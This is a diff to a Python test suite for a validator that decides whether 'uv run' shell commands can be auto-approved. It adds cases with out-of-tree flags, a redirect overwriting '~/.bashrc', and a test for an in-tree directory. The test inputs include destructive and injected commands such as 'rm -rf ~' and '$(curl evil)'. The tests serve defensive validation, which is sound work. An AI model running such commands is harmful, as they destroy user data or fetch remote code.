@@ -897,15 +897,30 @@ class TestUvRunEnvFlagNormalization:
             "uv run --extra dev mypy src/ && rm -rf ~",
             "uv run --extra dev mypy $(curl evil)",
             "uv run --directory apps/api pytest; rm -rf /tmp/x",
+            "uv run --python /tmp/x/fake --frozen pytest",
+            "uv run --python=3.12 pytest",
+            "uv run --project /tmp/evil pytest",
+            "uv run --directory ../other python manage.py migrate",
+            "uv run --directory=~/elsewhere pytest",
+            "uv run --frozen pytest > ~/.bashrc",
         ],
     )
-    def test_chained_inner_command_only_advises(
+    def test_never_decides_beyond_one_in_tree_command(
         self, validator: PrefixFrictionValidator, command: str
     ) -> None:
-        """A prefix match on the whole string cannot vouch for a chain."""
+        """GH-1795: the rule matched a prefix of the whole string and was
+        written for this checkout, so a chain, a file redirect or a flag
+        pointing elsewhere only advises."""
         result = validator.validate(inp=_make_input(command=command))
 
         assert getattr(result, "decides", False) is False
+
+    def test_relative_directory_in_tree_decides(self, validator: PrefixFrictionValidator) -> None:
+        result = validator.validate(
+            inp=_make_input(command="uv run --directory apps/api pytest tests/")
+        )
+
+        assert getattr(result, "decides", False) is True
 
     def test_with_pkg_disqualifies_auto_approval(self, validator: PrefixFrictionValidator) -> None:
         # `--with httpx` installs an arbitrary package — never auto-approve;
